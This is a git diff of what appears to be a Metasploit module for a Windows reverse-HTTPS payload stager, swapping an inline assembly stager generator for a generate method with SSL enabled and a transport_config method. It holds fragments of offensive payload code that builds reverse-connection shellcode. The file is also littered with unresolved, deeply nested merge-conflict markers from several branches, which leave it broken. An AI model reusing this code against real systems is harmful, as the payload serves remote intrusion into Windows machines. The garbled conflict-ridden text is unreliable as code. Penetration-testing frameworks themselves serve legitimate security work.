@@ -12,6 +12,7 @@ require 'msf/core'
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 require 'msf/core/payload/transport_config'
 =======
 >>>>>>> rapid7/feature/complex-payloads
@@ -248,6 +249,9 @@ require 'msf/core/payload/transport_config'
 =======
 >>>>>>> pod/complex-payloads
 >>>>>>> origin/pod/metasploit-windows.rb
+=======
+require 'msf/core/payload/transport_config'
+>>>>>>> origin/4.11.2_release_pre-rails4
 require 'msf/core/payload/windows/reverse_http'
 
 module Msf
@@ -263,6 +267,7 @@ module Msf
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 
 >>>>>>> rapid7/feature/complex-payloads
@@ -442,6 +447,8 @@ module Msf
 >>>>>>> origin/pod/metasploit-gemfile-
 =======
 >>>>>>> origin/pod/metasploit-windows.rb
+=======
+>>>>>>> origin/4.11.2_release_pre-rails4
 ###
 #
 # Complex payload generation for Windows ARCH_X86 that speak HTTPS
@@ -459,6 +466,7 @@ module Msf
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> origin/pod/metasploit-api/_index.html
 =======
@@ -521,28 +529,24 @@ module Payload::Windows::ReverseHttps
 =======
 >>>>>>> pod/complex-payloads
 
+=======
+>>>>>>> origin/4.11.2_release_pre-rails4
 module Payload::Windows::ReverseHttps
 
+  include Msf::Payload::TransportConfig
   include Msf::Payload::Windows::ReverseHttp
-
-  #
-  # Generate and compile the stager
-  #
-  def generate_reverse_https(opts={})
-    combined_asm = %Q^
-      cld                    ; Clear the direction flag.
-      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
-      #{asm_block_api}
-      start:
-        pop ebp
-      #{asm_reverse_http(opts)}
-    ^
-    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
-  end
 
   #
   # Generate the first stage
   #
+  def generate
+    super(ssl: true)
+  end
+
+  #
+  # Generate the transport-specific configuration
+  #
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1213,6 +1217,10 @@ module Payload::Windows::ReverseHttps
 =======
 >>>>>>> pod/complex-payloads
 >>>>>>> origin/pod/metasploit-windows.rb
+=======
+  def transport_config(opts={})
+    transport_config_reverse_https(opts)
+>>>>>>> origin/4.11.2_release_pre-rails4
   end
 
 end
